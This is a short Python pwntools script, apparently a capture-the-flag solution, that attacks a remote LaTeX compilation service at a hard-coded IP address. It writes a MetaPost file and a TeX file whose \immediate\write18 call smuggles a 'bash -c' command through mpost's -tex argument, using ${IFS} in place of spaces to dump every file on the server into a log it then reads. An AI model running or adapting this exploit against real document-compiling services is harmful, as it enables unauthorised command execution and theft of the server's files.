# Big thanks to this guy: https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/

from pwn import *

r = remote('78.46.224.91', 24242)

print r.recvuntil('> ')
log.info('Creating mp file')
r.sendline("create mp test")
print r.recvuntil("'.\n")

r.sendline("verbatimtex")
r.sendline("\documentclass{minimal}")
r.sendline("\\begin{document}")
r.sendline("etex")
r.sendline("beginfig (1)")
r.sendline("label(btex blah etex, origin);")
r.sendline("endfig;")
r.sendline("\end{document}")
r.sendline("bye")
r.sendline("\q")
print r.recvuntil('> ')

log.info('Creating tex file')
r.sendline("create tex lol")
print r.recvuntil("'.\n")

r.sendline("\documentclass{article}")
r.sendline("\\begin{document}")
r.sendline("\immediate\write18{mpost -ini \"-tex=bash -c (cat${IFS}$(find${IFS}.))>ls.log\" \"test.mp\"}")
r.sendline("\end{document}")
r.sendline("\q")
print r.recvuntil('> ')

log.info('Compiling...')
r.sendline("compile lol")
print r.recvuntil("> ")

log.info('Showing log')
r.sendline("show log ls")
print r.recvuntil("> ")
print r.recvuntil("> ")
print r.recvuntil("> ")

r.interactive()
